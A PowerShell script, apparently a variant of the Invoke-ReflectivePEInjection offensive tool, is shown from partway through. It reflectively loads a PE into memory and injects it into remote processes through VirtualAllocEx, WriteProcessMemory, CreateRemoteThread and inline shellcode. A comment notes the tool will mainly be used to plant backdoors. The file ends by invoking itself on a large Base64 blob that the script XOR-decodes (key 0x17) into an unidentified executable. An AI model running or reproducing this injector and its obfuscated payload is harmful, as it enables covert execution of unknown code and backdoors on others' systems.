		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = 	Get-Win32Functions
		$Win32Types = 		Get-Win32Types
		$Win32Constants =  	Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes  -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
				
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
				Write-Verbose "Calling function with WString return type"
				[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName $Func
				if ($WStringFuncAddr -eq [IntPtr]::Zero)
				{
					Throw "Couldn't find function address."
				}
				$WStringFuncDelegate = Get-DelegateType @() ([Int32])
				$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				[IntPtr]$OutputPtr = $WStringFunc.Invoke()
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	#{
    [Byte[]]$PEBytes = [System.Convert]::FromBase64String($PEBytes)
	
	for ($i = 0; $i -lt $PEBytes.Count; $i++)
	{
		$PEBytes[$i]=$PEBytes[$i] -bXOR 0x17
	}
	#[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	#}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    $PEBytes[0] = 0
    $PEBytes[1] = 0

	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $Func, $ProcId,$ForceASLR)
}

Main

}
Invoke-ReflectivePEInjection -PEBytes "Wk2HFxQXFxcTFxcX6OgXF68XFxcXFxcXVxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX9xcXFxkIrRkXox7aNq8WW9o2Q39+ZDdnZXhwZXZ6N3R2eXl4Yzd1cjdlYnk3fnk3U1hEN3p4c3I5GhodMxcXFxcXFxcNqnsJScsVWknLFVpJyxVa2oWNWkvLFVpSVotaXMsVWlJWv1o6yxVaQLOGWkbLFVpJyxRaI8sVWlJWvlpkyxVaUlaOWkjLFVpSVohaSMsVWkV+dH9JyxVaFxcXFxcXFxdHUhcXWxYTF20d500XFxcXFxcXF/cXFTYcFh0XFw8WFxeFFxcXFxcX0ZQXFxcHFxcXJxYXFxcXBxcHFxcXFRcXEhcWFxcXFxcSFxYXFxcXFxf3FhcXExcXFxcXFxUXVxYXFwcXFwcXFxcXBxcXBxcXFxcXFwcXFxeXZhYXdxcXF3t/FhebFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF9cWF7MHFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF79OFhdXFxcXFxcXFxcXFxcXJxYXmxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzljcm9jFxcXNgAWFxcHFxcXDxYXFxMXFxcXFxcXFxcXFxcXFzcXF3c5ZXN2Y3YXF/dWFxcXJxYXF1UXFxcLFhcXFxcXFxcXFxcXFxdXFxdXOXN2Y3YXFxcbJRcXF5cWFxcFFxcXSRYXFxcXFxcXFxcXFxcXVxcX1zllcnt4dBcXWwwXFxfXFhcXCxcXF2cWFxcXFxcXFxcXFxcXF1cXF1UXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX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